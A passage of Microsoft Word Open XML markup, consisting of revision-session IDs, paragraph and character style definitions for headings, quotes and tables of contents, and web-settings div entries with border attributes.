    <w:rsid w:val="00A3021D"/>
    <w:rsid w:val="00A342F7"/>
    <w:rsid w:val="00A36199"/>
    <w:rsid w:val="00A364C3"/>
    <w:rsid w:val="00A36FA5"/>
    <w:rsid w:val="00A4061E"/>
    <w:rsid w:val="00A43F7F"/>
    <w:rsid w:val="00A51EB2"/>
    <w:rsid w:val="00A52D37"/>
    <w:rsid w:val="00A53CB0"/>
    <w:rsid w:val="00A55EBF"/>
    <w:rsid w:val="00A563D4"/>
    <w:rsid w:val="00A578C9"/>
    <w:rsid w:val="00A612A6"/>
    <w:rsid w:val="00A64D06"/>
    <w:rsid w:val="00A6567C"/>
    <w:rsid w:val="00A702A8"/>
    <w:rsid w:val="00A72130"/>
    <w:rsid w:val="00A75980"/>
    <w:rsid w:val="00A775AB"/>
    <w:rsid w:val="00A80AB3"/>
    <w:rsid w:val="00A81938"/>
    <w:rsid w:val="00A83B85"/>
    <w:rsid w:val="00A83F07"/>
    <w:rsid w:val="00A846C8"/>
    <w:rsid w:val="00A867D6"/>
    <w:rsid w:val="00A9204E"/>
    <w:rsid w:val="00A9385C"/>
    <w:rsid w:val="00A96D14"/>
    <w:rsid w:val="00AB0294"/>
    <w:rsid w:val="00AB1082"/>
    <w:rsid w:val="00AB1DBA"/>
    <w:rsid w:val="00AB298A"/>
    <w:rsid w:val="00AB3D0D"/>
    <w:rsid w:val="00AB4401"/>
    <w:rsid w:val="00AB5CDD"/>
    <w:rsid w:val="00AC1111"/>
    <w:rsid w:val="00AC5A66"/>
    <w:rsid w:val="00AC6C9D"/>
    <w:rsid w:val="00AC7679"/>
    <w:rsid w:val="00AD0846"/>
    <w:rsid w:val="00AD5F2B"/>
    <w:rsid w:val="00AD6C6B"/>
    <w:rsid w:val="00AE0698"/>
    <w:rsid w:val="00AE405A"/>
    <w:rsid w:val="00AE5962"/>
    <w:rsid w:val="00AE7C3F"/>
    <w:rsid w:val="00AF3276"/>
    <w:rsid w:val="00AF6C2D"/>
    <w:rsid w:val="00B03F1C"/>
    <w:rsid w:val="00B07B35"/>
    <w:rsid w:val="00B112E6"/>
    <w:rsid w:val="00B12AE8"/>
    <w:rsid w:val="00B14520"/>
    <w:rsid w:val="00B16FC1"/>
    <w:rsid w:val="00B25C3A"/>
    <w:rsid w:val="00B26B6C"/>
    <w:rsid w:val="00B27BDC"/>
    <w:rsid w:val="00B34090"/>
    <w:rsid w:val="00B34D1C"/>
    <w:rsid w:val="00B357D1"/>
    <w:rsid w:val="00B359B1"/>
    <w:rsid w:val="00B36C08"/>
    <w:rsid w:val="00B43432"/>
    <w:rsid w:val="00B4780C"/>
    <w:rsid w:val="00B479F3"/>
    <w:rsid w:val="00B52B0F"/>
    <w:rsid w:val="00B54FE6"/>
    <w:rsid w:val="00B57AE6"/>
    <w:rsid w:val="00B57BEB"/>
    <w:rsid w:val="00B61E57"/>
    <w:rsid w:val="00B64C2D"/>
    <w:rsid w:val="00B66EFB"/>
    <w:rsid w:val="00B71000"/>
    <w:rsid w:val="00B71F94"/>
    <w:rsid w:val="00B73539"/>
    <w:rsid w:val="00B75BB6"/>
    <w:rsid w:val="00B77A19"/>
    <w:rsid w:val="00B80893"/>
    <w:rsid w:val="00B820DB"/>
    <w:rsid w:val="00B8384C"/>
    <w:rsid w:val="00B8413B"/>
    <w:rsid w:val="00B84EFB"/>
    <w:rsid w:val="00B867A6"/>
    <w:rsid w:val="00B912E7"/>
    <w:rsid w:val="00B93D00"/>
    <w:rsid w:val="00B97254"/>
    <w:rsid w:val="00BA1C42"/>
    <w:rsid w:val="00BA2BA7"/>
    <w:rsid w:val="00BA5271"/>
    <w:rsid w:val="00BA5AA3"/>
    <w:rsid w:val="00BA63CA"/>
    <w:rsid w:val="00BA717C"/>
    <w:rsid w:val="00BA73BE"/>
    <w:rsid w:val="00BB1E43"/>
    <w:rsid w:val="00BB2A52"/>
    <w:rsid w:val="00BB59EB"/>
    <w:rsid w:val="00BB7EBE"/>
    <w:rsid w:val="00BC006D"/>
    <w:rsid w:val="00BC25E9"/>
    <w:rsid w:val="00BC51D0"/>
    <w:rsid w:val="00BC5302"/>
    <w:rsid w:val="00BC6CDF"/>
    <w:rsid w:val="00BC7215"/>
    <w:rsid w:val="00BD1343"/>
    <w:rsid w:val="00BD1435"/>
    <w:rsid w:val="00BD416A"/>
    <w:rsid w:val="00BE0373"/>
    <w:rsid w:val="00BE1D1D"/>
    <w:rsid w:val="00BE6018"/>
    <w:rsid w:val="00BE7AC8"/>
    <w:rsid w:val="00BF6A60"/>
    <w:rsid w:val="00C03FCB"/>
    <w:rsid w:val="00C07574"/>
    <w:rsid w:val="00C10419"/>
    <w:rsid w:val="00C10501"/>
    <w:rsid w:val="00C133A2"/>
    <w:rsid w:val="00C14AA2"/>
    <w:rsid w:val="00C17004"/>
    <w:rsid w:val="00C31692"/>
    <w:rsid w:val="00C34C27"/>
    <w:rsid w:val="00C3693D"/>
    <w:rsid w:val="00C4220D"/>
    <w:rsid w:val="00C423F8"/>
    <w:rsid w:val="00C4486A"/>
    <w:rsid w:val="00C452A9"/>
    <w:rsid w:val="00C459F2"/>
    <w:rsid w:val="00C46E5C"/>
    <w:rsid w:val="00C5222F"/>
    <w:rsid w:val="00C629F8"/>
    <w:rsid w:val="00C64420"/>
    <w:rsid w:val="00C650FB"/>
    <w:rsid w:val="00C6670D"/>
    <w:rsid w:val="00C670D4"/>
    <w:rsid w:val="00C675C4"/>
    <w:rsid w:val="00C67888"/>
    <w:rsid w:val="00C70070"/>
    <w:rsid w:val="00C70821"/>
    <w:rsid w:val="00C72F16"/>
    <w:rsid w:val="00C75961"/>
    <w:rsid w:val="00C76127"/>
    <w:rsid w:val="00C76487"/>
    <w:rsid w:val="00C76C0D"/>
    <w:rsid w:val="00C80576"/>
    <w:rsid w:val="00C81885"/>
    <w:rsid w:val="00C824EA"/>
    <w:rsid w:val="00C924B1"/>
    <w:rsid w:val="00C9250F"/>
    <w:rsid w:val="00C92F0E"/>
    <w:rsid w:val="00C934C4"/>
    <w:rsid w:val="00C94DDF"/>
    <w:rsid w:val="00C96B14"/>
    <w:rsid w:val="00CA126F"/>
    <w:rsid w:val="00CA143A"/>
    <w:rsid w:val="00CA175D"/>
    <w:rsid w:val="00CA499A"/>
    <w:rsid w:val="00CA70DE"/>
    <w:rsid w:val="00CB4CCB"/>
    <w:rsid w:val="00CC1B62"/>
    <w:rsid w:val="00CD06BC"/>
    <w:rsid w:val="00CD4BEB"/>
    <w:rsid w:val="00CD53BD"/>
    <w:rsid w:val="00CD6114"/>
    <w:rsid w:val="00CE0000"/>
    <w:rsid w:val="00CE20B1"/>
    <w:rsid w:val="00CE2C3E"/>
    <w:rsid w:val="00CE4ABF"/>
    <w:rsid w:val="00CF0F7A"/>
    <w:rsid w:val="00CF1288"/>
    <w:rsid w:val="00CF1A3F"/>
    <w:rsid w:val="00CF235F"/>
    <w:rsid w:val="00CF4933"/>
    <w:rsid w:val="00CF6734"/>
    <w:rsid w:val="00CF67B2"/>
    <w:rsid w:val="00CF798C"/>
    <w:rsid w:val="00D0165D"/>
    <w:rsid w:val="00D03475"/>
    <w:rsid w:val="00D03FD1"/>
    <w:rsid w:val="00D10654"/>
    <w:rsid w:val="00D10983"/>
    <w:rsid w:val="00D16604"/>
    <w:rsid w:val="00D17A6F"/>
    <w:rsid w:val="00D20D25"/>
    <w:rsid w:val="00D24D13"/>
    <w:rsid w:val="00D25CA2"/>
    <w:rsid w:val="00D31358"/>
    <w:rsid w:val="00D32272"/>
    <w:rsid w:val="00D37481"/>
    <w:rsid w:val="00D37A0B"/>
    <w:rsid w:val="00D43116"/>
    <w:rsid w:val="00D434BD"/>
    <w:rsid w:val="00D50208"/>
    <w:rsid w:val="00D51594"/>
    <w:rsid w:val="00D518D5"/>
    <w:rsid w:val="00D52811"/>
    <w:rsid w:val="00D52FDE"/>
    <w:rsid w:val="00D60A17"/>
    <w:rsid w:val="00D6326A"/>
    <w:rsid w:val="00D6742F"/>
    <w:rsid w:val="00D71622"/>
    <w:rsid w:val="00D739E1"/>
    <w:rsid w:val="00D76292"/>
    <w:rsid w:val="00D800CC"/>
    <w:rsid w:val="00D81AA7"/>
    <w:rsid w:val="00D82790"/>
    <w:rsid w:val="00D86113"/>
    <w:rsid w:val="00D87E73"/>
    <w:rsid w:val="00D91614"/>
    <w:rsid w:val="00D916DE"/>
    <w:rsid w:val="00D9378B"/>
    <w:rsid w:val="00DA0CB0"/>
    <w:rsid w:val="00DA32D4"/>
    <w:rsid w:val="00DB04E4"/>
    <w:rsid w:val="00DB2C7F"/>
    <w:rsid w:val="00DB54B0"/>
    <w:rsid w:val="00DB7E01"/>
    <w:rsid w:val="00DC0A97"/>
    <w:rsid w:val="00DC1670"/>
    <w:rsid w:val="00DC3CA9"/>
    <w:rsid w:val="00DC3D52"/>
    <w:rsid w:val="00DC6B3C"/>
    <w:rsid w:val="00DC6F5A"/>
    <w:rsid w:val="00DD21C6"/>
    <w:rsid w:val="00DD3D12"/>
    <w:rsid w:val="00DD4141"/>
    <w:rsid w:val="00DE0F5D"/>
    <w:rsid w:val="00DE2AF0"/>
    <w:rsid w:val="00DE3DF6"/>
    <w:rsid w:val="00DE4CE7"/>
    <w:rsid w:val="00DE54CB"/>
    <w:rsid w:val="00DE5B83"/>
    <w:rsid w:val="00DE7D3F"/>
    <w:rsid w:val="00DF2386"/>
    <w:rsid w:val="00DF25AE"/>
    <w:rsid w:val="00DF2885"/>
    <w:rsid w:val="00DF2A99"/>
    <w:rsid w:val="00DF2DD6"/>
    <w:rsid w:val="00DF4A82"/>
    <w:rsid w:val="00DF6CDC"/>
    <w:rsid w:val="00DF7C47"/>
    <w:rsid w:val="00DF7E30"/>
    <w:rsid w:val="00E00714"/>
    <w:rsid w:val="00E00E88"/>
    <w:rsid w:val="00E012E5"/>
    <w:rsid w:val="00E02C5E"/>
    <w:rsid w:val="00E03D63"/>
    <w:rsid w:val="00E103F3"/>
    <w:rsid w:val="00E12FE5"/>
    <w:rsid w:val="00E1417D"/>
    <w:rsid w:val="00E163A5"/>
    <w:rsid w:val="00E21639"/>
    <w:rsid w:val="00E2321F"/>
    <w:rsid w:val="00E236CE"/>
    <w:rsid w:val="00E237AE"/>
    <w:rsid w:val="00E3057A"/>
    <w:rsid w:val="00E33C1A"/>
    <w:rsid w:val="00E35D48"/>
    <w:rsid w:val="00E36F88"/>
    <w:rsid w:val="00E442A6"/>
    <w:rsid w:val="00E4577B"/>
    <w:rsid w:val="00E45908"/>
    <w:rsid w:val="00E50E05"/>
    <w:rsid w:val="00E53C6D"/>
    <w:rsid w:val="00E56A73"/>
    <w:rsid w:val="00E612CB"/>
    <w:rsid w:val="00E62929"/>
    <w:rsid w:val="00E649CD"/>
    <w:rsid w:val="00E65E5F"/>
    <w:rsid w:val="00E67FA4"/>
    <w:rsid w:val="00E70AFD"/>
    <w:rsid w:val="00E71B5E"/>
    <w:rsid w:val="00E72C0B"/>
    <w:rsid w:val="00E82790"/>
    <w:rsid w:val="00E83D5B"/>
    <w:rsid w:val="00E85EEB"/>
    <w:rsid w:val="00E90805"/>
    <w:rsid w:val="00E950DF"/>
    <w:rsid w:val="00E96CE3"/>
    <w:rsid w:val="00EA0227"/>
    <w:rsid w:val="00EA5644"/>
    <w:rsid w:val="00EA585F"/>
    <w:rsid w:val="00EA63EB"/>
    <w:rsid w:val="00EA6816"/>
    <w:rsid w:val="00EA70F1"/>
    <w:rsid w:val="00EB032F"/>
    <w:rsid w:val="00EB0794"/>
    <w:rsid w:val="00EB0D68"/>
    <w:rsid w:val="00EB146F"/>
    <w:rsid w:val="00EB14E0"/>
    <w:rsid w:val="00EB3DAD"/>
    <w:rsid w:val="00EB4644"/>
    <w:rsid w:val="00EB49A5"/>
    <w:rsid w:val="00EB49BF"/>
    <w:rsid w:val="00EB6701"/>
    <w:rsid w:val="00EC2F7B"/>
    <w:rsid w:val="00EC3A31"/>
    <w:rsid w:val="00EC40AE"/>
    <w:rsid w:val="00EC48A0"/>
    <w:rsid w:val="00EC706E"/>
    <w:rsid w:val="00EC78F1"/>
    <w:rsid w:val="00EC7B5B"/>
    <w:rsid w:val="00EC7F9D"/>
    <w:rsid w:val="00ED27EA"/>
    <w:rsid w:val="00EE4124"/>
    <w:rsid w:val="00EE56BF"/>
    <w:rsid w:val="00EE624D"/>
    <w:rsid w:val="00EE6C41"/>
    <w:rsid w:val="00EF0AB2"/>
    <w:rsid w:val="00EF368C"/>
    <w:rsid w:val="00EF3BB8"/>
    <w:rsid w:val="00EF7106"/>
    <w:rsid w:val="00F00DA1"/>
    <w:rsid w:val="00F03BE4"/>
    <w:rsid w:val="00F054C7"/>
    <w:rsid w:val="00F05DF6"/>
    <w:rsid w:val="00F10D6C"/>
    <w:rsid w:val="00F13929"/>
    <w:rsid w:val="00F15E39"/>
    <w:rsid w:val="00F165C9"/>
    <w:rsid w:val="00F167B9"/>
    <w:rsid w:val="00F2286D"/>
    <w:rsid w:val="00F239A9"/>
    <w:rsid w:val="00F24BB3"/>
    <w:rsid w:val="00F25E0D"/>
    <w:rsid w:val="00F406FC"/>
    <w:rsid w:val="00F438D8"/>
    <w:rsid w:val="00F449AC"/>
    <w:rsid w:val="00F4532C"/>
    <w:rsid w:val="00F45B2D"/>
    <w:rsid w:val="00F45F6A"/>
    <w:rsid w:val="00F518E0"/>
    <w:rsid w:val="00F52D18"/>
    <w:rsid w:val="00F5305F"/>
    <w:rsid w:val="00F54C3C"/>
    <w:rsid w:val="00F55AC3"/>
    <w:rsid w:val="00F6266D"/>
    <w:rsid w:val="00F65DD3"/>
    <w:rsid w:val="00F66BFE"/>
    <w:rsid w:val="00F679D4"/>
    <w:rsid w:val="00F71712"/>
    <w:rsid w:val="00F71DCF"/>
    <w:rsid w:val="00F7302C"/>
    <w:rsid w:val="00F74D76"/>
    <w:rsid w:val="00F76105"/>
    <w:rsid w:val="00F82BD3"/>
    <w:rsid w:val="00F87F14"/>
    <w:rsid w:val="00F91234"/>
    <w:rsid w:val="00F96D93"/>
    <w:rsid w:val="00F97A59"/>
    <w:rsid w:val="00FA1067"/>
    <w:rsid w:val="00FA334C"/>
    <w:rsid w:val="00FA6566"/>
    <w:rsid w:val="00FA6BFC"/>
    <w:rsid w:val="00FA749B"/>
    <w:rsid w:val="00FA7604"/>
    <w:rsid w:val="00FB46DF"/>
    <w:rsid w:val="00FB5097"/>
    <w:rsid w:val="00FC35E2"/>
    <w:rsid w:val="00FD1287"/>
    <w:rsid w:val="00FD343F"/>
    <w:rsid w:val="00FD7B86"/>
    <w:rsid w:val="00FE1794"/>
    <w:rsid w:val="00FE2E27"/>
    <w:rsid w:val="00FE40F5"/>
    <w:rsid w:val="00FE5502"/>
    <w:rsid w:val="00FE63C6"/>
    <w:rsid w:val="00FF1ADC"/>
    <w:rsid w:val="00FF383D"/>
    <w:rsid w:val="00FF55CE"/>
    <w:rsid w:val="00FF62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1DBF"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{1A1F12B1-8211-4C8F-8FB7-940F3E16A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0E"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0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21C0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21C0E"/>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421C0E"/>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421C0E"/>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421C0E"/>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421C0E"/>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421C0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421C0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0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21C0E"/>
    <w:rPr>
      <w:caps/>
      <w:spacing w:val="15"/>
      <w:shd w:val="clear" w:color="auto" w:fill="DEEAF6" w:themeFill="accent1" w:themeFillTint="33"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="1F4D78" w:themeColor="accent1" w:themeShade="7F"/>
      <w:spacing w:val="15"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="2E74B5" w:themeColor="accent1" w:themeShade="BF"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="2E74B5" w:themeColor="accent1" w:themeShade="BF"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading6"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="2E74B5" w:themeColor="accent1" w:themeShade="BF"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading7Char">
    <w:name w:val="Heading 7 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading7"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="2E74B5" w:themeColor="accent1" w:themeShade="BF"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading8Char">
    <w:name w:val="Heading 8 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading8"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:caps/>
      <w:spacing w:val="10"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading9Char">
    <w:name w:val="Heading 9 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading9"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:caps/>
      <w:spacing w:val="10"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Title">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="TitleChar"/>
    <w:uiPriority w:val="10"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0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21C0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21C0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21C0E"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
      <w:spacing w:val="10"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleEmphasis">
    <w:name w:val="Subtle Emphasis"/>
    <w:uiPriority w:val="19"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="1F4D78" w:themeColor="accent1" w:themeShade="7F"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="1F4D78" w:themeColor="accent1" w:themeShade="7F"/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseEmphasis">
    <w:name w:val="Intense Emphasis"/>
    <w:uiPriority w:val="21"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:color w:val="1F4D78" w:themeColor="accent1" w:themeShade="7F"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="29"/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:uiPriority w:val="30"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0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21C0E"/>
    <w:rPr>
      <w:color w:val="5B9BD5" w:themeColor="accent1"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleReference">
    <w:name w:val="Subtle Reference"/>
    <w:uiPriority w:val="31"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="5B9BD5" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseReference">
    <w:name w:val="Intense Reference"/>
    <w:uiPriority w:val="32"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:caps/>
      <w:color w:val="5B9BD5" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="BookTitle">
    <w:name w:val="Book Title"/>
    <w:uiPriority w:val="33"/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:spacing w:val="0"/>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421C0E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="2E74B5"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421C0E"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00421C0E"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="00421C0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21C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21C0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64314"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000E78BF"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000E78BF"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000E78BF"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="400"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004C5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0655">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="731077808">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="809439591">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="924728117">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="976645440">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="984507911">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1014771997">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1800370885">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2074885063">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
